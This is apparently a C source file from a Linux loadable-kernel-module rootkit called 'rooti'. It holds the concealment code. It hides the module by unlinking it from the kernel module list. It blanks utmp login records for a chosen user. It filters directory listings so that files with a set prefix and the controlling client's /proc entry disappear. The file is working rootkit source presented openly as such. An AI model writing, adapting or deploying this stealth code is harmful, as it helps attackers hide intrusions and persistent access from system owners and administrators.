#include <linux/module.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include "utmp.h"
#include "hide.h"
#include "client.h"
#include "config.h"

/* 
 * Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
 * When hidden, the variable prev_module stores the address of the node that was previously
 * before this module in the list, otherwise it is NULL.
*/
bool rooti_hidden = false;
static struct list_head *prev_module = NULL;

/*
    Hides this rootkit by removing it from the kernel modules list.
*/
void rooti_hideme()
{
    rooti_hidden = true;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/*
    Reveals this rootkit by re-adding it to the kernel modules list.
*/
void rooti_showme()
{
    rooti_hidden = false;
    list_add(&THIS_MODULE->list, prev_module);
    prev_module = NULL;
}

int rooti_filter_login_entry(char *user_buf, size_t count, char *name)
{
    char *kernel_buf = kmalloc(count, GFP_KERNEL);
    if (kernel_buf == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
        return -ENOMEM;
    }
    int err = copy_from_user(kernel_buf, user_buf, count);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
        kfree(kernel_buf);
        return -EFAULT;
    }

    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
    if (strncmp(utmp_buf->ut_user, name, UT_NAMESIZE) == 0) {
        // Match found, fill the buffer with zeros, marking it as invalid
        memset(kernel_buf, 0, count);
        err = copy_to_user(user_buf, kernel_buf, count);
        if (err > 0) {
            printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
            kfree(kernel_buf);
            return -EFAULT;
        }
    }

    kfree(kernel_buf);
    return 0;
}

static bool rooti_should_hide_file(struct linux_dirent64 *record)
{
    // Check if the entry's name begins with the prefix of hidden files
    if (strlen(record->d_name) >= ROOTI_HIDE_PREFIX_LEN && 
        memcmp(record->d_name, ROOTI_HIDE_PREFIX, ROOTI_HIDE_PREFIX_LEN) == 0) {
        return true;
    }
    return false;
}

static bool rooti_should_hide_proc(struct linux_dirent64 *record, pid_t client_pid)
{
    // Convert client PID to string, essentially the filename in /proc
    char client_name[NAME_MAX];
    sprintf(client_name, "%d", client_pid);

    // Check if the entry is the PID directory inside of /proc of the client process
    return strncmp(record->d_name, client_name, NAME_MAX) == 0;
}

static size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record, struct linux_dirent64 *prev_record, size_t count)
{
    // Special case where the record to hide is the first one
    if (prev_record == NULL) {
        // Shift the entire buffer to override the first record
        count -= curr_record->d_reclen;
        memmove(curr_record, (void *)curr_record + curr_record->d_reclen, count);
    } else {
        // Increase the size of previous record to override the current record
        prev_record->d_reclen += curr_record->d_reclen;
    }
    return count;
}

static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_t count, bool is_proc_dir, pid_t client_pid)
{
    struct linux_dirent64 *curr_record = NULL;
    struct linux_dirent64 *prev_record = NULL;
    unsigned long offset = 0;
    
    while (offset < count) {
        curr_record = (void *)records_buf + offset;
        // Check if the current record should be hidden
        if (rooti_should_hide_file(curr_record) || (is_proc_dir && rooti_should_hide_proc(curr_record, client_pid))) {
            count = rooti_filter_dir_entry(curr_record, prev_record, count);
            if (curr_record == records_buf) {
                continue;
            }
        } else {
            prev_record = curr_record;
        }
        offset += curr_record->d_reclen;
    }
    return count;
}

size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir, pid_t client_pid)
{
    // Allocate a kernel buffer to store the data returned to user
    struct linux_dirent64 *kernel_buf = kmalloc(count, GFP_KERNEL);
    if (kernel_buf == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
        return count;
    }

    // Copy the return data of the syscall to our kernel buffer
    int err = copy_from_user(kernel_buf, user_buf, count);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
        kfree(kernel_buf);
        return count;
    }

    // Tamper with the returned records, concealing any files we wish to hide 
    count = rooti_filter_dir_entries(kernel_buf, count, is_proc_dir, client_pid);

    // Copy the rigged buffer back to userspace
    err = copy_to_user(user_buf, kernel_buf, count);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
    }

    kfree(kernel_buf);
    return count;
}